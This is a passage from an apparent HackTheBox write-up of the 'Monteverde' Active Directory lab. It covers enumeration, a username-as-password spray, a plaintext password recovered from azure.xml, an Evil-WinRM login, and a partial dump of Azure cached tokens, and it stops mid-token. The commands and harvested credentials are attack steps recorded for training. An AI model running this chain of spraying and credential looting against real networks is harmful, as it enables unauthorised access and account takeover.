---
{"dg-publish":true,"permalink":"/ct-fs/htb/monteverde/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #AD #Azure_AD_Connect #DCSync #DRS #Microsoft_SQL #Replication #leaked_creds


## Recon
![Pasted image 20261023214519.png](/img/user/CTFs/HTB/Images/Monteverde%20Images/Pasted%20image%2020261023214519.png)

### Nmap:
```zsh
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49676,49696 -sV -sC -T4 -Pn -oA 10.129.228.111 10.129.228.111
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-24 00:47 -0400
Nmap scan report for 10.129.228.111
Host is up (0.094s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-24 04:47:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-24T04:48:31
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.36 seconds
```
Initial portscanning shows a common suite of Windows ports and services including: DNS, Kerberos, SMB, MSRPC, and LDAP. Adding `MONTEVERDE.MEGABANK.LOCAL` to `/etc/hosts`
### Netexec & RPC
#### Enumerating Null and Guest Access
##### SMB Shares
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/monteverde/scanning]
└─$ nxc smb monteverde.megabank.local -u '' -p '' --shares   
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.129.228.111  445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/monteverde/scanning]
└─$ nxc smb monteverde.megabank.local -u 'Guest' -p '' --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest: STATUS_ACCOUNT_DISABLED 
```
We see we don't have share access with Null nor Guest
##### Users
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/monteverde/scanning]
└─$ rpcclient -c "enumdomusers" -U '' -N monteverde.megabank.local 
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/monteverde/scanning]
└─$ nxc smb monteverde.megabank.local -u '' -p '' --users 
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.129.228.111  445    MONTEVERDE       -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.228.111  445    MONTEVERDE       Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.228.111  445    MONTEVERDE       AAD_987d7f2f57d2              2020-01-02 22:53:24 0       Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. 
SMB         10.129.228.111  445    MONTEVERDE       mhope                         2020-01-02 23:40:05 0        
SMB         10.129.228.111  445    MONTEVERDE       SABatchJobs                   2020-01-03 12:48:46 0        
SMB         10.129.228.111  445    MONTEVERDE       svc-ata                       2020-01-03 12:58:31 0        
SMB         10.129.228.111  445    MONTEVERDE       svc-bexec                     2020-01-03 12:59:55 0        
SMB         10.129.228.111  445    MONTEVERDE       svc-netapp                    2020-01-03 13:01:42 0        
SMB         10.129.228.111  445    MONTEVERDE       dgalanos                      2020-01-03 13:06:10 0        
SMB         10.129.228.111  445    MONTEVERDE       roleary                       2020-01-03 13:08:05 0        
SMB         10.129.228.111  445    MONTEVERDE       smorgan                       2020-01-03 13:09:21 0        
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated 10 local users: MEGABANK

```
Enumerating Null and Guest access we find that we can enumerate users via `rpcclient` and nxc. Looking at the description for the `AAD_987d7f2f57d2` user we see it refers to a specific installation identifier: `05c97990-7587-4a3d-b312-309adfc172d9`. That could be something useful as I don't come across it often when enumerating users.

## Initial Access
### Password Spraying
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/monteverde/files]
└─$ nxc smb monteverde.megabank.local -u users.txt -p users.txt
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```
With our newly generated list of users we spray them in both the username and password fields and get a hit for the user `SABatchJobs` with it's own username as the password. Let's see what kinds of access that user has.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/monteverde/files]
└─$ nxc smb monteverde.megabank.local -u 'SABatchJobs' -p 'SABatchJobs'                    
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
```
As a quick sanity check I verify that the creds are indeed the username for both fields.

### Remote Management Users
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/monteverde/files]
└─$ nxc ldap monteverde.megabank.local -u 'SABatchJobs' -p 'SABatchJobs' --groups "Remote Management Users"
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
LDAP        10.129.228.111  389    MONTEVERDE       mhope
```
Using our newly stolen creds we enumerate LDAP for members of the "Remote Management Users". It shows us that user `mhope` likely has `user.txt` sitting on their Desktop. So let's focus on getting to her account.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/monteverde/files]
└─$ nxc ldap monteverde.megabank.local -u 'SABatchJobs' -p 'SABatchJobs' -M groupmembership -o USER=mhope      
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
GROUPMEM... 10.129.228.111  389    MONTEVERDE       [+] User: mhope is member of following groups: 
GROUPMEM... 10.129.228.111  389    MONTEVERDE       Azure Admins
GROUPMEM... 10.129.228.111  389    MONTEVERDE       Remote Management Users
GROUPMEM... 10.129.228.111  389    MONTEVERDE       Domain User
```
Enumerating mhope's group membership we see they are also a member of the Azure Admins group. This could be very useful if we find a way to pivot to her account.

### Authenticated Share Access
```zsh
┌──(kali㉿kali)-[~/…/HTB/monteverde/files/bloodhound]
└─$ nxc smb monteverde.megabank.local -u 'SABatchJobs' -p 'SABatchJobs' --shares                                                  
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       users$          READ 
```
Enumerating share access with our newly acquired creds we see we have read access to the 'azure_uploads' and 'users$' shares which come across as the most non-standard. Let's dig deeper.

#### Enumerating 'users$'
```zsh
┌──(kali㉿kali)-[~/…/HTB/monteverde/files/bloodhound]
└─$ smbclient -U 'megabank.local/SABatchJobs%SABatchJobs' \\\\monteverde.megabank.local\\users$       
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

		31999 blocks of size 4096. 28979 blocks available
```
Connecting to the `users$` share reveals directories with multiple directories named after users in the domain.

```zsh
smb: \> cd mhope
smb: \mhope\> dir
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

		31999 blocks of size 4096. 28979 blocks available

```
Starting with our target we see there's one file in her's called `azure.xml`

```zsh
smb: \> tarmode
tarmode is now full, system, hidden, noreset, noverbose
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
getting file \mhope\azure.xml of size 1212 as mhope/azure.xml (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
smb: \> dir
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

\dgalanos
  .                                   D        0  Fri Jan  3 08:12:30 2020
  ..                                  D        0  Fri Jan  3 08:12:30 2020

\mhope
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

\roleary
  .                                   D        0  Fri Jan  3 08:10:30 2020
  ..                                  D        0  Fri Jan  3 08:10:30 2020

\smorgan
  .                                   D        0  Fri Jan  3 08:10:24 2020
  ..                                  D        0  Fri Jan  3 08:10:24 2020

```
I also discover that this is the only file on the share. -.- sus.

```zsh
──(kali㉿kali)-[~/…/HTB/monteverde/loot/smb]
└─$ cat azure.xml        
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```
Reading out the file we see what appears to be a hardcoded plaintext password at the bottom. Let's try it out.

```zsh
┌──(kali㉿kali)-[~/…/HTB/monteverde/loot/smb]
└─$ nxc smb monteverde.megabank.local -u 'mhope' -p '4n0therD4y@n0th3r$'        
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
```
And there you have it. We successfully authenticate to the server as `mhope`.

### Evil-WinRM
#### User.txt
```zsh
┌──(kali㉿kali)-[~/…/HTB/monteverde/loot/smb]
└─$ evil-winrm -i 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'
                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\mhope\Documents> dir ../Desktop


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/23/2026   9:44 PM             34 user.txt
```
Remebering earlier that we established `mhope` as the only lower-privileged user that can get shell access via membership in "Remote Management Users", I login to the machine and find `user.txt` sitting on her Desktop.

#### Filesystem Enumeration
```zsh
C:\Users\mhope\.Azure> cat TokenCache.dat
‡https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://graph.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0©{"RefreshToken":"AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA","ResourceInResponse":"https:\/\/graph.windows.net\/","Result":{"AccessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OC8iLCJpYXQiOjE1NzgwNTgyNzYsIm5iZiI6MTU3ODA1ODI3NiwiZXhwIjoxNTc4MDYyMTc2LCJhY3IiOiIxIiwiYWlvIjoiNDJWZ1lBZ3NZc3BPYkdtYjU4V3ZsK0d3dzhiYXA4bnhoOWlSOEpVQit4OWQ5L0g2MEFBQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJhcHBpZGFjciI6IjAiLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiVWFTMGI5ZHJsMmlmYzlvSXZjcUFlbzRoY3c1YWpyV3g3bU5DMklrMkRsayIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJsM2xBR3NBRVYwcVdQelJ1Vkh4U0FBIiwidmVyIjoiMS4wIn0.czHUwYjleGp2C1c_BMZIZkEHz-12R86qmngaiyTeTW_bM659hqetbQylvf_qCJDuxD8e28H6Oqw5Hn1Hwij7yHK-kOjUeUlXkGyzFhQbDf3CQLvFsZioUiHHiighrVjZfu6Rolv8fxoG3Q8cXS-Ms_Wm6RI-zcaK9Eyu841D51jzvYI60rC9HTummktfVURP2xf3DnskqjJF1dDlSi62gPGXGk0xZordZFiGoYAtv8qiMAiSCioN_sw_xWRJ250nvw90biQ1NkPRpSGf8jNpbYktB0Ti8-sNblaGRJBQqmHxZ-0PkSq31op2CzHN7wwYCJOEoJpOtS-x4j1DGZ19hA","AccessTokenType":"Bearer","ExpiresOn":{"DateTime":"\/Date(1578062173584)\/","OffsetMinutes":0},"ExtendedExpiresOn":{"DateTime":"\/Date(1578062173584)\/","OffsetMinutes":0},"ExtendedLifeTimeToken":false,"IdToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4Mjc2LCJuYmYiOjE1NzgwNTgyNzYsImV4cCI6MTU3ODA2MjE3NiwiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.","TenantId":"372efea9-7bc4-4b76-8839-984b45edfb98","UserInfo":{"DisplayableId":"john@a67632354763outlook.onmicrosoft.com","FamilyName":"Clark","GivenName":"John","IdentityProvider":"https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/","PasswordChangeUrl":null,"PasswordExpiresOn":null,"UniqueId":"e4f56bc1-021f-4795-bca2-bedfc819e90a"}},"UserAssertionHash":null}‘https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://management.core.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0‡{"RefreshToken":"AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA","ResourceInResponse":"https:\/\/management.core.windows.net\/","Result":{"AccessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYWNyIjoiMSIsImFpbyI6IjQyVmdZSGc3ajlGN3oxK24renhKZktXQmpxcWRYMzFEVDNLc2ovL2FzT1d5VFcycTNRSUEiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMTk1MGEyNTgtMjI3Yi00ZTMxLWE5Y2YtNzE3NDk1OTQ1ZmMyIiwiYXBwaWRhY3IiOiIwIiwiZmFtaWx5X25hbWUiOiJDbGFyayIsImdpdmVuX25hbWUiOiJKb2huIiwiZ3JvdXBzIjpbImM3OTRlNzE3LTIxZWYtNDljZS1hZjAwLTljMDEwZGM0MWE3NiJdLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoid1U4Y1RtUm5tTzM2Z1E5MEx4VUNiN0tGMXZ3NlVUVlVKa1VPNThJd3NVTSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI